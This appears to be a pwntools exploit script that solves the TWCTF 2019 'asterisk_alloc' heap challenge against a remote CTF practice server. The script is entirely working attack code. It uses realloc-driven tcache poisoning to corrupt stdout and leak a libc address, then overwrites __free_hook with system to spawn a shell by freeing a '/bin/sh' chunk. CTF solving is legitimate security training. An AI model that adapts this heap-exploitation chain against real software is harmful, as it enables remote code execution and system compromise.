from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('TWCTF_online_2019_asterisk_alloc')
io = remote('node4.buuoj.cn', 29634)
# libc = ELF('/home/payoung/Downloads/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')
libc = ELF('libc-2.27.so')
elf = ELF('TWCTF_online_2019_asterisk_alloc')


def add(Type, size, data):
    io.sendlineafter('Your choice: ', str(Type))
    io.sendlineafter('Size: ', str(size))
    io.sendafter('Data: ', data)


def delete(Type):
    io.sendlineafter('Your choice: ', '4')
    io.sendlineafter('Which: ', Type)


def leak():
    global libc_base
    add(3, 0x18, 'chunk0')
    add(3, 0, '')
    add(3, 0x88, 'chunk1')
    add(3, 0, '')
    add(3, 0x28, 'chunk2')
    add(3, 0, '')
    add(3, 0x88, 'chunk1')
    for _ in range(7):
        delete('r')
    add(3, 0, '')
    add(3, 0x18, 'chunk0')
    payload = b'fake_chunk0'.ljust(0x18, b'\x00') + p64(0x41) + p16(0x9760)
    add(3, 0xa8, payload)
    add(3, 0, '')
    add(3, 0x88, 'fake_chunk1')
    add(3, 0, '')
    payload = p64(0xfbad1800) + p64(0) * 3 + p8(0x58)
    add(1, 0x88, payload)
    libc_base = u64(io.recvn(6).ljust(8, b'\x00')) - libc.sym['_IO_file_jumps']
    if libc_base & 0xff0000000000 != 0x7f0000000000:
        raise EOFError
    log.success('libc_base: ' + hex(libc_base))


def pwn():
    __free_hook = libc_base + libc.sym['__free_hook']
    system = libc_base + libc.sym['system']
    payload = b'fake_chunk0'.ljust(0x18, b'\x00') + p64(0x51) + p64(__free_hook - 8)
    add(3, 0xa8, payload)
    add(3, 0, '')
    add(3, 0x38, 'fake_chunk1')
    add(3, 0, '')
    add(3, 0x38, b'/bin/sh\x00' + p64(system))
    delete('r')
    io.interactive()
    # gdb.attach(io)
    # pause()


if __name__ == '__main__':
    while True:
        try:
            leak()
        except EOFError:
            io.close()
            # io = process('TWCTF_online_2019_asterisk_alloc')
            io = remote('node4.buuoj.cn', 29634)
        else:
            break
    pwn()
